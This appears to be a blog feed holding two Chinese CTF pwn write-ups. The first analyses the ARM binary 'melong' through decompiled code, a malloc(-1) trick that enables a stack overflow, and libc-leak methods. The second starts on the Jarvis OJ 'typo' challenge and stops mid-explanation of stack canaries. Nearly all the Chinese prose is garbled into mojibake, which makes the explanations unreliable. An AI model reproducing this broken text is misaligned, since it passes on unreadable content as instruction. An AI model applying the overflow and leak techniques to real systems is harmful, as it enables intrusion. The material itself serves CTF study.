        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10Êúà16-Codegate2018-melong"><a href="#Pwn-10Êúà16-Codegate2018-melong" class="headerlink" title="Pwn-10Êúà16-Codegate2018-melong"></a>Pwn-10Êúà16-Codegate2018-melong</h1><blockquote><p>ÂêåÊ†∑ÂÄüÂä©<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/" target="_blank" rel="noopener">m4xÂ§ß‰Ω¨</a>ÁöÑÂçöÂÆ¢Êù•Áúã‰∏ÄÁúãËøô‰∏ÄÈ¢òÊòØ‰∏Ä‰∏™ÊÄé‰πàÊ†∑ÁöÑËß£È¢òÊÄùË∑Ø„ÄÇ</p><p>Ê†πÊçÆÂ§ß‰Ω¨ÂéüËØù<code>ÊºèÊ¥ûÂæàÂ•ΩÊâæ, write_diary ‰∏≠ read ÁöÑÈïøÂ∫¶ÊòØÁî±Êàë‰ª¨ËæìÂÖ•ÁöÑ, ÂèØ‰ª•Ê†àÊ∫¢Âá∫, ÂÖàËøõÂÖ• PT ÂáΩÊï∞, ËæìÂÖ• -1, ÂÜçËøõÂÖ• write_diary, Â∞±ÂèØ‰ª•ÂÆûÁé∞ arbitrary overflow ‰∫Ü, Âõ†Ê≠§ÊÄùË∑ØÂêå x64 ‰∏ãÁöÑ rop Áõ∏Âêå, ÂÖà leak Âá∫ libc Âü∫ÂùÄ, ÁÑ∂ÂêéÊéßÂà∂ÊâßË°å system(‚Äú/bin/sh‚Äù) Âç≥ÂèØ</code>ÔºåÊàë‰ª¨Êù•ËøõË°åÂàÜÊûêÔºö</p></blockquote><h2 id="‰∏Ä-Êü•Áúã‰øùÊä§Êé™ÊñΩ"><a href="#‰∏Ä-Êü•Áúã‰øùÊä§Êé™ÊñΩ" class="headerlink" title="‰∏Ä.Êü•Áúã‰øùÊä§Êé™ÊñΩ"></a>‰∏Ä.Êü•Áúã‰øùÊä§Êé™ÊñΩ</h2><blockquote><p>ÂÖàÁúã‰∏Ä‰∏ãÁ®ãÂ∫èÁöÑÂü∫Êú¨‰ø°ÊÅØÂíØÔºö</p><p><img src="https://i.loli.net/2018/10/16/5bc55a518786c.png" alt=""></p><p>ÂèØ‰ª•Áü•ÈÅìËøô‰∏™ÊòØ‰∏™32‰ΩçarmÊû∂ÊûÑÁöÑÁ®ãÂ∫èÔºåÂπ∂‰∏îÈúÄË¶ÅÂä®ÊÄÅÈìæÊé•ÂÖ±‰∫´Â∫ìÊù•ËøêË°å„ÄÇÁúã‰∏Ä‰∏ãÂÆÉÁöÑ‰øùÊä§Êé™ÊñΩÔºö</p><p>‚Äã    <img src="https://i.loli.net/2018/10/16/5bc55b1e51a4f.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞Âπ∂Ê≤°ÊúâÂºÄÂêØÊ†àÊ∫¢Âá∫‰øùÊä§Ôºå‰ª•ÂèänxÔºåpieÁ≠â‰øùÊä§Êé™ÊñΩ„ÄÇ</p></blockquote><h2 id="‰∫å-ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"><a href="#‰∫å-ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë" class="headerlink" title="‰∫å.ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"></a>‰∫å.ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë</h2><blockquote><p>ÂÖà‰∏ãËΩΩ‰∏Ä‰∏ãÁº∫Â∞ëÁöÑÂä®ÊÄÅÂÖ±‰∫´Â∫ìÔºö</p><p><code>sudo apt-get install libc6-armel-cross</code></p><p>ËøôÊ†∑ÂèØ‰ª•Ëß£ÂÜ≥Áº∫Â∞ë<code>/lib/ld-linux.so.3</code>ÁöÑÈóÆÈ¢òÔºåÁÑ∂ÂêéÁÆÄÂçïËøêË°å‰∏Ä‰∏ãÁúãÁúãÔºö</p><p><img src="https://i.loli.net/2018/10/16/5bc5eaee90791.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞heightËæìÂÖ•ÁöÑÂú∞ÊñπÂèØËÉΩÂ≠òÂú®Ê∫¢Âá∫ÔºåÊé•‰∏ãÊù•idaÁúã‰∏ÄÁúãÁ®ãÂ∫èÈÄªËæëÔºö</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r0</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-54h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+34h] [bp-20h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+38h] [bp-1Ch]</span>  size_t v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+40h] [bp-14h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4Ch] [bp-8h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the BPSEC gym\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. Check your bmi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. Exercise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. Register personal training"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. Write daily record"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5. Have some health menu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"6. Out of the gym\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Type the number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v3 <span class="token operator">=</span> <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v9 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">check</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>          <span class="token function">exercise</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">check_first</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>          v8 <span class="token operator">=</span> <span class="token function">PT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">check_first</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span>          <span class="token function">write_diary</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you should take personal training first!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token function">diet_menu</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>LABEL_14<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you again :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid number :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ËøõÂÖ•case3ÁöÑPTÂáΩÊï∞ÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∏™Âà§Êñ≠Ôºö</p><pre class=" language-c"><code class="language-c">size_t <span class="token function">PT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  size_t v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r3</span>  size_t size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4h] [bp-10h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+8h] [bp-Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Ch] [bp-8h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's start personal training"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How long do you want to take personal training?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ptr Â∞Ü‰ºöÁî≥ËØ∑‰∏Ä‰∏™sizeÂ§ßÂ∞èÁöÑÂÜÖÂ≠òÁ©∫Èó¥ÔºåÂ¶ÇÊûúÊàë‰ª¨ËæìÂÖ•-1ÁªôsizeÔºåÈÇ£‰πàmalloc‰ºöÁî≥ËØ∑Â§±Ë¥•ÂØºËá¥ptr‰∏∫null</span>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> ptr <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>exc2 <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//ptr == NULL Âà§Êñ≠ÊàêÁ´ãÂèØ‰ª•ËøõÂÖ•case4</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Okay, start to exercise!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you are getting healthy.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    v0 <span class="token operator">=</span> size<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Check your bmi again!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>‰πãÂâçËÆ∞ÁöÑÈÇ£‰∏™ÁúãËµ∑Êù•ÂÉèÊòØÁ™ÅÁ†¥ÁÇπÁöÑÂú∞ÊñπÂÖ∂ÂÆûÂπ∂‰∏çÊòØÔºåÁúüÊ≠£ÁöÑÊ∫¢Âá∫ÁÇπÂú®case4Ôºö</p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span>__fastcall <span class="token function">write_diary</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>result<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-14h]</span>  <span class="token keyword">unsigned</span> __int8 nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+Fh] [bp-5h]</span>  buf <span class="token operator">=</span> a2<span class="token punctuation">;</span>  nbytes <span class="token operator">=</span> <span class="token operator">*</span>result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> nbytes <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Ê∫¢Âá∫ÁÇπÂï¶</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you wrote %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ÁÑ∂ÂêéÂë¢Ôºå‰ªéËøôÈáåÂ∞±Âà∞‰∫ÜÂºÄÂßãÁñØÁãÇÁöÑË°•ÂßøÂäøÁöÑÊó∂ÂÄô‰∫Ü„ÄÇÂõ†‰∏∫ËøôÈ¢òÂíå‰∏äÈ¢òÁ±ª‰ººÔºåÈúÄË¶ÅÊàë‰ª¨ÊâæÂà∞systemÂáΩÊï∞ÁöÑÂú∞ÂùÄÊâçË°åÂë¢ÔºåÁªôËá™Â∑±Êåñ‰∫Ü‰∏™Â§ßÂùëÔºå‰ª•ÂêéÂÜçÊù•Â°´Âêß„ÄÇ</p></blockquote><h3 id="systemÂú∞ÂùÄÊ≥ÑÈú≤-amp-amp-leak-libc"><a href="#systemÂú∞ÂùÄÊ≥ÑÈú≤-amp-amp-leak-libc" class="headerlink" title="systemÂú∞ÂùÄÊ≥ÑÈú≤&amp;&amp;leak libc"></a>systemÂú∞ÂùÄÊ≥ÑÈú≤&amp;&amp;leak libc</h3><p><a href="http://www.freebuf.com/articles/rookie/155971.html" target="_blank" rel="noopener">ÂèÇËÄÉÊñáÁ´†1</a></p><p><a href="https://www.cnblogs.com/HacTF/p/8052175.html" target="_blank" rel="noopener">ÂèÇËÄÉÊñáÁ´†2</a></p><blockquote><p> „Äê1„ÄëÂà©Áî®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÊ≥ÑÈú≤Ê†à‰∏≠ÁöÑÊï∞ÊçÆÔºå‰ªéËÄåÊâæÂà∞libcÁöÑÊüê‰∏™ÂáΩÊï∞Âú∞ÂùÄÔºåÂÜçÂà©Áî®libc-databaseÊù•Âà§Êñ≠ËøúÁ®ãlibcÁöÑÁâàÊú¨Ôºå‰πãÂêéÂÜçËÆ°ÁÆóÂá∫libcÁöÑÂü∫ÂùÄ„ÄÇ</p><p>„Äê2„ÄëÂà©Áî®writeËøô‰∏™ÂáΩÊï∞ÔºåpwntoolsÊúâ‰∏™ÂæàÂ•ΩÁî®ÁöÑÂáΩÊï∞DynELFÂéªÂà©Áî®Ëøô‰∏™ÂáΩÊï∞ËÆ°ÁÆóÂá∫Á®ãÂ∫èÁöÑÂêÑÁßçÂú∞ÂùÄÔºåÂåÖÊã¨ÂáΩÊï∞ÁöÑÂü∫Âú∞ÂùÄÔºålibcÁöÑÂü∫Âú∞ÂùÄÔºålibc‰∏≠systemÁöÑÂú∞ÂùÄ„ÄÇ</p><p>„Äê3„ÄëÂà©Áî®printfÂáΩÊï∞ÔºåprintfÂáΩÊï∞ËæìÂá∫ÁöÑÊó∂ÂÄôÈÅáÂà∞0x00Êó∂ÂÄô‰ºöÂÅúÊ≠¢ËæìÂá∫ÔºåÂ¶ÇÊûúËæìÂÖ•ÁöÑÊó∂ÂÄôÊ≤°ÊúâÂú®ÊúÄÂêéÁöÑÂ≠óËäÇÂ§ÑÂ°´ÂÖÖ0x00ÔºåÈÇ£‰πàËæìÂá∫ÁöÑÊó∂ÂÄôÂ∞±ÂèØËÉΩÊ≥ÑÈú≤Ê†à‰∏≠ÁöÑÈáçË¶ÅÊï∞ÊçÆÔºåÊØîÂ¶ÇlibcÁöÑÊüê‰∏™ÂáΩÊï∞Âú∞ÂùÄ„ÄÇ</p></blockquote><blockquote><p><strong>ÂÖ≥‰∫éPLTÔºàËøõÁ®ãÈìæÊé•Ë°®ÔºâÂíåGOTÔºàGlobal Offset Table-ÂÖ®Â±ÄÂÅèÁßªË°®Ôºâ</strong>Ôºö‰∏∫‰∫ÜÁÅµÊ¥ªÂà©Áî®ËôöÊãüÂÜÖÂ≠òÁ©∫Èó¥ÔºåÊâÄ‰ª•ÁºñËØëÂô®ÂèØ‰ª•‰∫ßÁîü‰ΩçÁΩÆÊó†ÂÖ≥ÁöÑ‰ª£Á†Å„ÄÇÂèØÊâßË°åÊñá‰ª∂ÂèØ‰ª•ÊòØ‰ΩçÁΩÆÊó†ÂÖ≥ÁöÑÔºå‰πüÂèØ‰ª•ÊòØ‰ΩçÁΩÆÁõ∏ÂÖ≥ÁöÑÔºå Âä®ÊÄÅÈìæÊé•Â∫ìÁªùÂ§ßÂ§öÊï∞ÈÉΩÊòØ‰ΩçÁΩÆÊó†ÂÖ≥ÁöÑ„ÄÇ GOTË°®ÂèØÂÜô‰∏çÂèØÊâßË°åÔºå PLTÂèØÊâßË°å‰∏çÂèØÂÜô„ÄÇ‰ªñ‰ª¨Áõ∏‰∫í‰ΩúÁî®Êù•ÂÆûÁé∞ÂáΩÊï∞Á¨¶Âè∑ÁöÑÂª∂Êó∂ÁªëÂÆö.„ÄÇASLRÂπ∂‰∏çÈöèÊú∫ÂåñPLTÈÉ®ÂàÜÔºåÊâÄ‰ª•ÂØπret2pltÊîªÂáªÊ≤°ÊúâÁõ¥Êé•ÂΩ±Âìç„ÄÇ ‰∏∫Èò≤Ê≠¢ÊÅ∂ÊÑè‰øÆÊîπgotÔºå ÈìæÊé•Âô®Êèê‰æõ‰∫ÜRELROÈÄâÈ°π,ÔºåÂéªÈô§gotÁöÑÂÜôÊùÉÈôêÔºå ‰ΩÜ‰πüÁâ∫Áâ≤‰∫ÜÂª∂Êó∂ÁªëÂÆöÂ∏¶Êù•ÁöÑÂ•ΩÂ§Ñ„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà15-qemu</title>
      <link href="/2018/10/15/Pwn-10%E6%9C%8815-qemu/"/>
      <url>/2018/10/15/Pwn-10%E6%9C%8815-qemu/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10Êúà15-ÁÆÄÂçï‰∫ÜËß£ÂºÇÊûÑpwnÈ¢ò"><a href="#Pwn-10Êúà15-ÁÆÄÂçï‰∫ÜËß£ÂºÇÊûÑpwnÈ¢ò" class="headerlink" title="Pwn-10Êúà15-ÁÆÄÂçï‰∫ÜËß£ÂºÇÊûÑpwnÈ¢ò"></a>Pwn-10Êúà15-ÁÆÄÂçï‰∫ÜËß£ÂºÇÊûÑpwnÈ¢ò</h1><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ÂèÇÁÖßm4xÂ§ß‰Ω¨ÁöÑÂçöÂÆ¢ÁÆÄÂçïÂú∞Êê≠Âª∫‰∫Ü‰∏Ä‰∏ãÁéØÂ¢ÉÂêéÔºåÁªßÁª≠Êù•ÁªÉÁªÉÊâãÔºåÁÆÄÂçï‰∫ÜËß£‰∏Ä‰∏ãÂºÇÊûÑbinaryË∞ÉËØïÔºåÂ¶ÇarmÔºåmipsÔºåÁéØÂ¢ÉÊê≠Âª∫ÂèÇÁÖß‰∏ä‰∏ÄÁØá„ÄÇ</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p><p>arm ÁöÑÂèÇÊï∞ 1 ~ 4 ÂàÜÂà´‰øùÂ≠òÂà∞ r0 ~ r3 ÂØÑÂ≠òÂô®‰∏≠, Ââ©‰∏ãÁöÑÂèÇÊï∞‰ªéÂè≥ÂêëÂ∑¶‰æùÊ¨°ÂÖ•Ê†à, Ë¢´Ë∞ÉÁî®ËÄÖÂÆûÁé∞Ê†àÂπ≥Ë°°, ËøîÂõûÂÄºÂ≠òÊîæÂú® r0 ‰∏≠ „ÄÇarm ÁöÑ pc ÊåáÈíàÁõ∏ÂΩì‰∫é eip/rip, b/bl Á≠âÊåá‰ª§ÂÆûÁé∞‰∫ÜË∑≥ËΩ¨ </p></blockquote><h2 id="Jarvis-oj-typo"><a href="#Jarvis-oj-typo" class="headerlink" title="Jarvis oj - typo"></a>Jarvis oj - typo</h2><blockquote><p>ÁÆÄÂçïËØ¥‰∏Ä‰∏ãÊ≠•È™§ÔºöÂÖàÊü•Áúã‰øùÊä§Êé™ÊñΩÔºåÂèØ‰ª•ÂèëÁé∞Ê≤°ÊúâÊ†àÊ∫¢Âá∫‰øùÊä§ÔºåËøêË°åÁ®ãÂ∫èÊúâÊ∫¢Âá∫ÁÇπÂèØ‰ª•Âà©Áî®ÔºåÁÑ∂ÂêéÂèØ‰ª•ÊâæÂà∞Ê∫¢Âá∫ÁÇπ‰ΩçÁΩÆÔºåÊâæÂà∞systemÂáΩÊï∞Ôºå‰ª•Âèä/bin/shÂ≠óÁ¨¶‰∏≤ÁöÑ‰ΩçÁΩÆÔºåÁÑ∂ÂêéÊãøÂà∞ËÉΩÂ§üÊéßÂà∂ r0ÂØÑÂ≠òÂô®</p></blockquote><h3 id="‰∏Ä-Êü•Áúã‰øùÊä§Êé™ÊñΩ"><a href="#‰∏Ä-Êü•Áúã‰øùÊä§Êé™ÊñΩ" class="headerlink" title="‰∏Ä. Êü•Áúã‰øùÊä§Êé™ÊñΩ"></a>‰∏Ä. Êü•Áúã‰øùÊä§Êé™ÊñΩ</h3><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#checksec typo</span>    Arch:     arm-32-little    <span class="token comment" spellcheck="true">#32‰ΩçÂ∞èÁ´ØÂ∫è armÊû∂ÊûÑÁ®ãÂ∫è</span>    RELRO:    Partial RELRO    Stack:    No canary found    <span class="token comment" spellcheck="true">#Êó†Ê†àÊ∫¢Âá∫‰øùÊä§</span>    NX:       NX enabled            PIE:      No PIE <span class="token punctuation">(</span>0x8000<span class="token punctuation">)</span></code></pre><blockquote><p>È°∫‰æøÂ≠¶‰π†‰∏Ä‰∏ãÂá†ÁßçÈò≤Êä§Êé™ÊñΩÁöÑÊÑèÊÄùÔºö</p><p> ÂèÇËÄÉÈìæÊé•Ôºö<a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">https://www.jianshu.com/p/6e528b33e37a</a></p><p> ‚Äã    <strong>RELRO</strong>:Âú®LinuxÁ≥ªÁªüÂÆâÂÖ®È¢ÜÂüüÊï∞ÊçÆÂèØ‰ª•ÂÜôÁöÑÂ≠òÂÇ®Âå∫Â∞±‰ºöÊòØÊîªÂáªÁöÑÁõÆÊ†áÔºåÂ∞§ÂÖ∂ÊòØÂ≠òÂÇ®ÂáΩÊï∞ÊåáÈíàÁöÑÂå∫ÂüüÔºåÂ∞ΩÈáèÂáèÂ∞ëÂèØÂÜôÁöÑÂ≠òÂÇ®Âå∫ÂüüÂèØ‰ΩøÂÆâÂÖ®Á≥ªÊï∞ÊèêÈ´ò„ÄÇGCC, GNU linker‰ª•ÂèäGlibc-dynamic linker‰∏ÄËµ∑ÈÖçÂêàÂÆûÁé∞‰∫Ü‰∏ÄÁßçÂè´ÂÅörelroÁöÑÊäÄÊúØRelocation Read Only, ÈáçÂÆöÂêëÂè™ËØªÔºåÂÆûÁé∞Â∞±ÊòØÁî±linkerÊåáÂÆöbinaryÁöÑ‰∏ÄÂùóÁªèËøádynamic linkerÂ§ÑÁêÜËøá relocation‰πãÂêéÁöÑÂå∫Âüü‰∏∫Âè™ËØª„ÄÇ</p><p> ‚Äã    Ê†àÊ∫¢Âá∫Ê£ÄÊü•ÔºåÁî®<strong>CanaryÈáë‰∏ùÈõÄÂÄº</strong>ÊòØÂê¶ÂèòÂåñÊù•Ê£ÄÊµã,Canary 